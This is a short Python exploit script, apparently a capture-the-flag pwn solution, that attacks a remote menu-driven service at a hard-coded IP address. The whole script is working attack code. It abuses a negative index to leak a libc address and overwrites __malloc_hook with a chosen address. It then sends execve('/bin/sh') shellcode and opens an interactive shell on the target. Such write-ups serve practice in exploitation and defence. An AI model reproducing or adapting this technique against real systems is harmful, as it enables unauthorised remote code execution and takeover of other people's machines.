from PwnIOI import *

s = IOI(['54.202.2.54',8888])
s.read_until('name:')
s.write('A'*8)
s.read_until('(y/n)')
s.write('y\n')
s.read_until('Password')
s.write(p64(0x602A70)+p64(0x1234))
s.read_until('>>')
s.write('1\n')
s.read_until('Index:')
s.write('-6\n')
s.read_until('>>')
s.write('2\n')
s.read_until(':')
s.write(p64(0x601F78))
s.read_until('>>')
s.write('3\n')
s.read_until('Index:')
s.write('0\n')
libc = u64(s.read_until('\n')[-1-6:-1]+'\x00\x00') - 0x83a70
malloc_hook = libc + 0x3c3b10
log(" libc : 0x%x"%libc)
s.read_until('>>')
s.write('5\n')
s.read_until('Password:')
s.write(p64(0x602A70)+p64(0x1234))
s.read_until('name:')
s.write('A'*8)
s.read_until('password:')
s.write(p64(malloc_hook)+p64(0x1234)+'\n')
s.read_until('>>')
s.write('2\n')
s.read_until(':')
s.write(p64(0x400B47))
s.read_until('>>')
s.write('1\n')
s.read_until('Index:')
s.write('1\n')
s.read_until(':')
s.write('1234\n')
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
s.read_until('here')
s.write(sc)
s.interact()
